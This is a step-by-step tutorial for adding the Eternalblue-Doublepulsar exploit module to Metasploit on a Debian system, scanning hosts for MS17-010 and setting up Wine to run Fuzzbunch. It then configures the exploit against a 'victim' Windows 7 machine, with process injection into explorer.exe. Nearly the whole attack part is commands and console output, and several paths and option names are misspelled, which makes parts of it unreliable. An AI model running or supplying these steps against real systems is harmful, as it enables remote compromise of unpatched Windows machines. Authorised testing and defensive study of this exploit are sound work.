---
author:
- David Johnson
index: 'Windows!Clients!EternalBlue DoublePulsar'
setupfile: '\"../org-html-themes/org/theme-readtheorg-local-1.setup\"'
title: Eternalblue Doublepulsar
---

This tutorial will cover how to add Eternalblue-Doublepulsar to
Metasploit framework on any Debian based distro. As well as run the
Fuzzbunch framework through wine.

Prerequisites
=============

-   Debian based distro

-   Metasploit

-   Wine

-   Eternalbule-doublepulsar

Step 1:
=======

Will the target fall victim?
----------------------------

We will want to check to see if the target victim is vulnerable. To do
this we will need to add a module to Metasploit. Specifically we want
ms~17010~ which we can find on exploit db. Download the file and move it
into Metasploits scanner module.

``` {.example}
cp *.rb /usr/share/metasploit-framework/modules/auxiliary/scanner/smb/smb_ms_17_010.rb
```

Now start up Metasploit and lets test everything out.

``` {.example}
msfconsole
```

Let\'s make sure our new module loaded.

``` {.example}
reload_all
```

Now use the module by entering the following.

``` {.example}
use auxiliary/scanner/smb/smb_ms_17_010
```

There will be a few requirements for this to work. To list them all
enter the following.

``` {.example}
show options
```

or

``` {.example}
options
```

Here we really just need to set the value of RHOSTS.

``` {.example}
set RHOSTS <IP address or addresses>
```

If the machine is likely vulnerable you will see something like this.

``` {.example}
[!] 192.168.0.100:445         -Host is likely VULNERABLE to MS17-010!
```

Step 2:
=======

Clone Eternalblue-Doublepulsar-Metasploit
-----------------------------------------

The next step it to clone Eternalblue-Doublepulsar-Metasploit from
github. We can add it to Metasploits path like we did before by adding
directly to Metasploit. However here we will add it the prefered way.

Metasploit prefers external modules to be placed in .msf4/modules found
in your root directory. We will need to make a few directories for our
purpose such as exploits/windows.

Clone Enternalblue-Doublepulsar-Metasploit into this directory.

``` {.example}
git clone https://github.com/ElevenPaths/Eternalblue-Doublepulsar-Metasploit.git
```

Change into Eternalblue-Doublepulsar-Metasploit.

``` {.example}
cd Eternalblue-Doublepulsar-Metasploit
```

Now copy eternalblue~doublepulsar~.rb to the appropriate directory.

``` {.example}
cp eternalblue_doublepulsar.rb /root/.msf4/modules/exploits/windows/smb/
```

Step 3:
=======

We need to install wine because Fuzzbunch was written for Windows.

As always we begin with update

``` {.example}
apt update
```

Install Wine and other Wine tools

``` {.example}
apt install wine winbind winetricks
```

We need to add x32 because fuzzbunch was written for Windows Xp.

``` {.example}
dpkg --add-architecture i386
```

Update and install Wine32

``` {.example}
apt-get update && apt-get install wine32
```

Set Path variable.

``` {.example}
WINEPREFIX="$HOME/.wine"
```

Set Wine Architecture

``` {.example}
WINEARCH=win32 wine wineboot
```

Add to bashrc

``` {.example}
echo "export WINEPREFIX=$HOME/.wine" >> ~/.bashrc
```

Step 4:
=======

Exploit
-------

With everything setup its time to exploit our victim. Begin by starting
Metasploit.

``` {.example}
msfconsole
```

Use our new module. Pro tip Tab is your friend.

``` {.example}
use exploit/windows/Enternalblur-Doublepulsar-Metasploit/Enternalblur-Doublepulsar/
```

We will need to set the path to Doublepulsar and Eternalblue.

``` {.example}
set DOUBLEPULSAR ~/.msf4/modules/exploits/windows/Enternalblur-Doublepulsar-Metasploit/deps
```

``` {.example}
set ETERNALBLUE ~/.msf4/modules/exploits/windows/Enternalblur-Doublepulsar-Metasploit/deps
```

I recommend setting the process injection to explorer.exe

``` {.example}
set PORCESSINJECT explorer.exe
```

Set RHOST to the victim\'s IPaddress.

``` {.example}
set RHOST <>
```

We want to make sure we are targeting the right version of Windows.

``` {.example}
show target
```

We are attacking Windows 7 so enter the appropriate corresponding number

``` {.example}
set target <>
```

references
==========

<https://www.youtube.com/watch?v=fWwXjXexlT8>

<https://github.com/mdiazcl/fuzzbunch-debian>

<https://www.exploit-db.com/exploits/41891/>

<https://www.youtube.com/watch?v=wDAkiXxm1gE>

<https://github.com/ElevenPaths/Eternalblue-Doublepulsar-Metasploit>

<https://www.youtube.com/watch?v=mJWMqLF00fM>
